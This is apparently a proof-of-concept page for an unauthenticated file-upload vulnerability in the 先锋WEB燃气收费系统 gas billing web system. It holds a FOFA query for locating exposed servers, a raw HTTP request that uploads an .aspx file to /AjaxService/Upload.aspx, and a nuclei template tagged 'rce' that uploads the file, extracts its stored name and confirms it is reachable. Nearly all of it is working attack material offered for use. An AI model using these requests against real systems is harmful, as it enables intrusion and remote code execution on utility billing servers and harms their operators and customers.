## 先锋WEB燃气收费系统文件上传漏洞

## fofa
```
app="先锋WEB燃气收费系统"
```

## poc
```
POST /AjaxService/Upload.aspx HTTP/1.1
Host: target
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------352149293954742437289922451
Content-Length: 351
Origin: null
Connection: close
Upgrade-Insecure-Requests: 1

-----------------------------352149293954742437289922451
Content-Disposition: form-data; name="Fdata"; filename="123.aspx"
Content-Type: application/octet-stream

hello
-----------------------------352149293954742437289922451
Content-Disposition: form-data; name="submit"

Submin
-----------------------------352149293954742437289922451--
```

![adb288fb428b3c35f303468198c26dc6](https://github.com/wy876/POC/assets/139549762/4510946f-a8c9-4ea5-92bc-ef5ba62ebfae)

## nuclei 
```

id: xianfeng_files_upload
info:
  name: xianfeng_files_upload
  author: joyboy
  severity: critical
  description: 先锋WEB燃气收费系统文件上传漏洞
  metadata:
    max-request: 1
    fofa-query: app="先锋WEB燃气收费系统"
    verified: true
  tags: rce

requests:
  - raw:
      - |-
        POST /AjaxService/Upload.aspx HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
        Content-Type: multipart/form-data; boundary=---------------------------352149293954742437289922451
        Content-Length: 349
        Origin: null
        Connection: close
        Upgrade-Insecure-Requests: 1

        -----------------------------352149293954742437289922451
        Content-Disposition: form-data; name="Fdata"; filename="123.aspx"
        Content-Type: application/octet-stream

        hello
        -----------------------------352149293954742437289922451
        Content-Disposition: form-data; name="submit"

        Submin
        -----------------------------352149293954742437289922451--
        
      - |-
        GET /UploadFile/{{date_time("%Y%M")}}/{{timestrp}} HTTP/1.1
        Host: {{Hostname}}
        
    extractors:
      - type: regex
        name: timestrp
        internal: true
        part: body
        regex:
          - '[0-9]{16}.aspx' 
          
    matchers-condition: and
    matchers:
      - type: word
        part: body_2
        words:
          - hello
      - type: status
        status:
          - 200
```
